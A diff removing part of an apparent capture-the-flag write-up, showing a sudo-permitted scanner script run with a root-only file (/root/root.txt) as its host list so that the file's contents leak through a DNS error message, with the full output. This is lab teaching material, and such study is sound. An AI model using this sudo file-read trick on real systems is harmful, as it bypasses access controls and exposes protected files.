@@ -473,38 +473,6 @@ SCAN SUMMARY
 
 **Success!** The error message revealed the root flag clearly: `flag{root-[REDACTED]}`
 
-The flag appears in:
-- The `[ERROR]` line as the "hostname"
-- The connection error details with URL-encoded version: `flag%7broot-[REDACTED]%7d`
-- The DNS resolution error message
-
-Verified with verbose mode for additional clarity:
-
-```bash
-bot@React:/home/bot$ sudo /opt/react2shell/scanner.py -l /root/root.txt -v
-
-brought to you by assetnote
-
-[*] Loaded 1 host(s) to scan
-[*] Using 10 thread(s)
-[*] Timeout: 10s
-[*] Using RCE PoC check
-[!] SSL verification disabled
-
-[ERROR] flag{root-[REDACTED]} - Connection Error: HTTPSConnectionPool(host='flag%7broot-[REDACTED]%7d', port=443): Max retries exceeded with url: / (Caused by NameResolutionError("HTTPSConnection(host='flag%7broot-[REDACTED]%7d', port=443): Failed to resolve 'flag%7broot-[REDACTED]%7d' ([Errno -2] Name or service not known)"))
-
-============================================================
-SCAN SUMMARY
-============================================================
-  Total hosts scanned: 1
-  Vulnerable: 0
-  Not vulnerable: 1
-  Errors: 0
-============================================================
-```
-
-**Root Flag:** `flag{root-[REDACTED]}`
-
 ---
 
 ## Summary
